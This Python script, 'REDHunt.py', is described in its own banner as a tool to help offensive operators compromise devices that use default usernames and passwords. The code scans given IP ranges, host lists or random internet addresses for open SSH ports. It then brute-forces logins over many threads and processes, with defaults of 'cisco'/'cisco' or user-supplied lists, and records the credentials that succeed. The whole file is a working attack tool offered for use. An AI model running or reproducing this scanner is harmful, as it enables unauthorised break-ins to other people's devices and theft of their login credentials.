#!/usr/bin/ python3

from termcolor import colored
from socket import *
import multiprocessing
import threading
import time
import paramiko
import sys
import os
import logging
import argparse
import random



def banner():
    print (colored('/ / ///╭━━━┳━━━┳━━━╮╭━━━╮╭╮╱╭╮╱╱╱╱╱╭╮ // / //', 'red'))
    print (colored(' / /// ┃╭━╮┃╭━━┻╮╭╮┃┃╭━╮┃┃┃╱┃┃╱╱╱╱╭╯╰╮/ / ///', 'red'))
    print (colored('/ /// /┃╰━╯┃╰━━╮┃┃┃┃┃┃╱╰╯┃╰━╯┣╮╭┳━╋╮╭╯ / /// ', 'red'))
    print (colored(' /// //┃╭╮╭┫╭━━╯┃┃┃┃┃┃╱╭╮┃╭━╮┃┃┃┃╭╮┫┃ /  // /', 'red'))
    print (colored('/ / ///┃┃┃╰┫╰━━┳╯╰╯┃┃╰━╯┃┃┃╱┃┃╰╯┃┃┃┃╰╮  /  //', 'red'))
    print (colored(' /  // ╰╯╰━┻━━━┻━━━╯╰━━━╯╰╯╱╰┻━━┻╯╰┻━╯ /  // ', 'red'))
    print ('')
    print (colored('This tool was created to assist offensive operators in', 'green'))
    print (colored('compromising devices using defualt user/pass ', 'green'))
    print ('')
    print (colored('Author:     Hawk3ye', 'green'))

def version():
    print ('[+] REDHunt.py  By Hawk3ye')
    exit(0)

def test_file(filename):
    try:
        outfile = open(filename, 'a')
        outfile.close()
    except:
        print ('[-] ERROR: Cannot write to file \'%s\'' % filename)
        exit(1)

def argspage():
    parser = argparse.ArgumentParser(
    usage='\n\n   python3 %(prog)s -i <arg> | -r <arg> | -I <arg>',
    formatter_class=argparse.RawDescriptionHelpFormatter,
    epilog=
    'examples:\n\n' \

    '  scanning and attacking random ips\n' \
    '  usage: python3 %(prog)s -r 50 -L password.txt\n\n' \

    '  scanning and attacking an ip-range\n' \
    '  usage: python3 %(prog)s -i 192.168.0.1-254 -u admin -l troll\n\n' \

    '  attack ips from file\n' \
    '  usage: python3 %(prog)s -I ips.txt -L passwords.txt\n',
    add_help=False
    )
    
    options = parser.add_argument_group('options', '')
    options.add_argument('-i', default=False, metavar='<ip/range>',
            help='ip-address/-range (e.g.: 192.168.0-3.1-254)')
    options.add_argument('-I', default=False, metavar='<file>',
            help='list of target ip-addresses')
    options.add_argument('-r', default=False, metavar='<num>',
            help='attack random hosts')
    options.add_argument('-p', default=22, metavar='<num>',
            help='port number (default: 22)')
    options.add_argument('-t', default=4, metavar='<num>',
            help='threads per host (default: 4)')
    options.add_argument('-f', default=8, metavar='<num>',
            help='attack max hosts parallel (default: 8)')
    options.add_argument('-u', default='cisco', metavar='<username>',
            help='single username (default: cisco)')
    options.add_argument('-U', default=False, metavar='<file>',
            help='list of usernames')
    options.add_argument('-l', default='cisco', metavar='<password>',
            help='single password (default: cisco)')
    options.add_argument('-L', default=False, metavar='<file>',
            help='list of passwords')
    options.add_argument('-o', default=False, metavar='<file>',
            help='write found logins to file')
    options.add_argument('-T', default=3, metavar='<sec>',
            help='timeout in seconds (default: 3)')
    options.add_argument('-V', action='store_true',
            help='print version of REDHunt.py and exit')

    args = parser.parse_args()

    if args.V:
        version()

    if (args.i == False) and (args.I == False) and (args.r == False):
        print ('')
        parser.print_help()
        exit(0)

    return args

def scan(target, port, timeout):
    s = socket(AF_INET, SOCK_STREAM)
    s.settimeout(timeout)
    result = s.connect_ex((target, port))
    s.close()
    if result == 0:
        HOSTLIST.append(target)

def thread_scan(args, target):
    port = int(args.p)
    to = float(args.T)
    bam = threading.Thread(target=scan, args=(target, port, to,))
    bam.start()
    while threading.activeCount() > 200:
        time.sleep(0.0001)
    time.sleep(0.0001)

def scan_output(i):
    sys.stdout.flush()
    sys.stdout.write('\r[*] hosts scanned: {0} | ' \
            'possible to attack: {1}'.format(i, len(HOSTLIST)))

def ip_range(args):
    targets = args.i
    a = tuple(part for part in targets.split('.'))
    
    rsa = list(range(4))
    rsb = list(range(4))
    for i in list(range(0,4)):
        ga = a[i].find('-')
        if ga != -1:
            rsa[i] = int(a[i][:ga])
            rsb[i] = int(a[i][1+ga:]) + 1
        else:
            rsa[i] = int(a[i])
            rsb[i] = int(a[i]) + 1

    print ('[*] scanning %s for open port' % targets)
    m = 0
    for i in range (rsa[0], rsb[0]):
        for j in range (rsa[1], rsb[1]):
            for k in range (rsa[2], rsb[2]):
                for l in range(rsa[3], rsb[3]):
                    target = '%d.%d.%d.%d' % (i, j, k, l)
                    m += 1
                    scan_output(m)
                    thread_scan(args, target)   

    while threading.activeCount() > 1:
        time.sleep(0.1)
    scan_output(m)
    print ('\n[*] finished scan.')
    print('\n[*] Starting Attacks!')
    print('[*] Please Wait! Large user/pass Lists will take longer!')

def rand():
        return random.randrange(0,256)

def rand_ip(args):
    i = 0
    print ('[*] scanning random ips for port services')
    while len(HOSTLIST) < int(args.r):
        target = '%d.%d.%d.%d' % (rand(), rand(), rand(), rand())
        i += 1
        scan_output(i)
        thread_scan(args, target)

    while threading.activeCount() > 1:
        time.sleep(0.1)
    scan_output(i)
    print ('\n[*] Finished Scanning.')
    print('\n[*] Starting Attacks!')
    print('[*] Please Wait! Large user/pass Lists will take longer!')

def file_exists(filename):
    try:
        open(filename).readlines()
    except IOError:
        print ('[-] ERROR: cannot open file \'%s\'' % filename)
        exit(1)

def ip_list(ipfile):
    file_exists(ipfile)
    hosts = open(ipfile).readlines()
    for host in hosts:
        HOSTLIST.append(host)

def write_logins(filename, login):
    outfile = open(filename, 'a')
    outfile.write(login)
    outfile.close()

def crack(target, prt, user, passw, outfile, to, i):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    user = user.replace('\n', '')
    passw = passw.replace('\n', '')
    try:
        ssh.connect(target, port=prt, username=user, password=passw, timeout=to)

        login = ('%s:%s | %s:%s' % (target, prt, user, passw))
        print(colored(login, 'green'))
        if outfile:
            write_logins(outfile, login + '\n')
        ssh.close()
        os._exit(0)
    except paramiko.AuthenticationException:
        ssh.close()
    except:
        ssh.close()
        if i < 8:
            i += 1
            ra = random.uniform(0.2, 0.6)
            time.sleep(ra)
            crack(target, prt, user, passw, outfile, to, i)
        else:
            print ('[-] TimedOut - Stopping Attacks Against %s' % (target))
            os._exit(1)

def thread_it(target, args):
    port = int(args.p)
    user = args.u
    userlist = args.U
    password = args.l
    passlist = args.L
    outfile = args.o
    to = float(args.T)
    threads = int(args.t)

    if userlist:
        user = open(userlist).readlines()
    else:
        user = [ user ]
    if passlist:
        password = open(passlist).readlines()
    else:
        password = [ password ]

    try:
        for us in user:
            for pw in password:
                Run = threading.Thread(target=crack, args=(target, port, us, pw,
                    outfile, to, 0,))
                Run.start()
                while threading.activeCount() > threads:
                    time.sleep(0.01)
                time.sleep(0.001)

        while threading.activeCount() > 1:
            time.sleep(0.001)
    except KeyboardInterrupt:
        os._exit(1)

def fork_it(args):
    threads = int(args.t)
    childs = int(args.f)
    len_hosts = len(HOSTLIST)


    i = 1
    for host in HOSTLIST:
        host = host.replace('\n', '')
        print ('[*] performing attacks against %s [%d/%d]' % (host, i, len_hosts))
        hostfork = multiprocessing.Process(target=thread_it,args=(host, args))
        hostfork.start()
        while len(multiprocessing.active_children()) >= childs:
            time.sleep(0.001)

        time.sleep(0.001)
        i += 1
    while multiprocessing.active_children():
        time.sleep(0.01)

def empty_hostlist():
    if len(HOSTLIST) == 0:
        print ('\n[-] found no targets to attack!')
        exit(1)

def finished():
    print (colored('/ / ///╭━━━┳━━━┳━━━╮╭━━━╮╭╮╱╭╮╱╱╱╱╱╭╮ // / //', 'red'))
    print (colored(' / /// ┃╭━╮┃╭━━┻╮╭╮┃┃╭━╮┃┃┃╱┃┃╱╱╱╱╭╯╰╮/ / ///', 'red'))
    print (colored('/ /// /┃╰━╯┃╰━━╮┃┃┃┃┃┃╱╰╯┃╰━╯┣╮╭┳━╋╮╭╯ / /// ', 'red'))
    print (colored(' /// //┃╭╮╭┫╭━━╯┃┃┃┃┃┃╱╭╮┃╭━╮┃┃┃┃╭╮┫┃ /  // /', 'red'))
    print (colored('/ / ///┃┃┃╰┫╰━━┳╯╰╯┃┃╰━╯┃┃┃╱┃┃╰╯┃┃┃┃╰╮  /  //', 'red'))
    print (colored(' /  // ╰╯╰━┻━━━┻━━━╯╰━━━╯╰╯╱╰┻━━┻╯╰┻━╯ /  // ', 'red'))
    print (colored('//  /// /  / ╭━━━┳━━━┳━╮/╭┳━━━╮//// / // // /', 'green'))
    print (colored('/  /// /  / /╰╮╭╮┃╭━╮┃┃╰╮┃┃╭━━╯/// / // // / ', 'green'))
    print (colored('  /// /  / / ╱┃┃┃┃┃╱┃┃╭╮╰╯┃╰━━╮// / // // / /', 'green'))
    print (colored(' ///    / / /╱┃┃┃┃┃╱┃┃┃╰╮┃┃╭━━╯/ / /  // / / ', 'green'))
    print (colored('/ /    / / //╭╯╰╯┃╰━╯┃┃╱┃┃┃╰━━╮ / /   / / / /', 'green'))
    print (colored(' /    /   // ╰━━━┻━━━┻╯╱╰━┻━━━╯/     / / / / ', 'green'))

def main():
    banner()
    args = argspage()

    if args.U:
        file_exists(args.U)
    if args.L:
        file_exists(args.L)
    if args.o:
        test_file(args.o)

    if args.i:
        ip_range(args)
    elif args.I:
        ip_list(args.I)
    else:
        rand_ip(args)
    
    time.sleep(0.01)
    empty_hostlist()
    fork_it(args)
    finished()

if __name__ == '__main__':
    HOSTLIST = []
    try:
        logging.disable(logging.CRITICAL)
        main()
    except KeyboardInterrupt:
        #print (HOSTLIST, sep ='\n')
        print ('bye bye!!!')
        time.sleep(0.2)
        os._exit(1)

